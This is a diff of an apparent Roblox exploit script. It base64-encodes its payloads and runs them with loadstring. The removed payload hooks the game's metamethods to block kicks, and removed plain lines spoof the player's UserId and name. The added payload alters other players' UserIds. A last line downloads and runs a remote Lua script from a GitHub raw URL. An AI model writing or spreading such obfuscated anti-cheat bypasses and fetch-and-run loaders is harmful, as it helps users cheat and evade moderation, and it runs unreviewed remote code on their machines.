@@ -1,7 +1,7 @@
 local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
 local function dec()
-data = string.gsub("bG9jYWwgbXQgPSBnZXRyYXdtZXRhdGFibGUoZ2FtZSkKbG9jYWwgb2xkID0gbXQuX19uYW1lY2FsbApsb2NhbCBwcm90ZWN0ID0gbmV3Y2Nsb3N1cmUgb3IgcHJvdGVjdF9mdW5jdGlvbgoKaWYgbm90IHByb3RlY3QgdGhlbgpwcm90ZWN0ID0gZnVuY3Rpb24oZikgcmV0dXJuIGYgZW5kCmVuZAoKc2V0cmVhZG9ubHkobXQsIGZhbHNlKQptdC5fX25hbWVjYWxsID0gcHJvdGVjdChmdW5jdGlvbihzZWxmLCAuLi4pCmxvY2FsIG1ldGhvZCA9IGdldG5hbWVjYWxsbWV0aG9kKCkKaWYgbWV0aG9kID09ICJLaWNrIiB0aGVuCndhaXQoOWU5KQpyZXR1cm4KZW5kCnJldHVybiBvbGQoc2VsZiwgLi4uKQplbmQpCmhvb2tmdW5jdGlvbihnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5LaWNrLHByb3RlY3QoZnVuY3Rpb24oKSB3YWl0KDllOSkgZW5kKSkKCmdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwge1RpdGxlID0gIlJheSBYIEJ5cGFzcyIsIFRleHQgPSAiTWFkZSBieSBpbWllIzAwMzkiLCBEdXJhdGlvbiA9IDh9KQ==", '[^'..b..'=]', '')
+data = string.gsub("Zm9yIGksdiBpbiBwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgdi5DaGF0dGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgdi5Vc2VySWQgPSBtYXRoLnJhbmRvbSgxMDAwMDAwMDAwLCAyMDAwMDAwMDAwKQogICAgcHJpbnQoIkNoYW5nZWQgIi4udi5OYW1lLi4iJ3MgVXNlcklkIikKICAgIHdhaXQoMC41KQogICAgdi5Vc2VySWQgPSB2LkNoYXJhY3RlckFwcGVhcmFuY2VJZAogICAgZW5kKQplbmQKCmdhbWUuUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIHBsci5DaGF0dGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgcGxyLlVzZXJJZCA9IG1hdGgucmFuZG9tKDEwMDAwMDAwMDAsIDIwMDAwMDAwMDApCiAgICBwcmludCgiQ2hhbmdlZCAiLi5wbHIuTmFtZS4uIidzIFVzZXJJZCIpCiAgICB3YWl0KDAuNSkKICAgIHBsci5Vc2VySWQgPSBwbHIuQ2hhcmFjdGVyQXBwZWFyYW5jZUlkCiAgICBlbmQpCmVuZCkKCmdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwge1RpdGxlID0gIlJheSBYIEJ5cGFzcyIsIFRleHQgPSAiTWFkZSBieSBpbWllIzAwMzkiLCBEdXJhdGlvbiA9IDh9KQ==", '[^'..b..'=]', '')
         return (data:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
@@ -16,11 +16,5 @@ data = string.gsub("bG9jYWwgbXQgPSBnZXRyYXdtZXRhdGFibGUoZ2FtZSkKbG9jYWwgb2xkID0g
 end
 
 loadstring(dec())()
-
-local LP = game:GetService("Players").LocalPlayer
-LP.UserId = 953043143
-LP.CharacterAppearanceId = 953043143
-LP.Character.Name = string.reverse("R3K1RTSTON")
-LP.Name = string.reverse("R3K1RTSTON")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
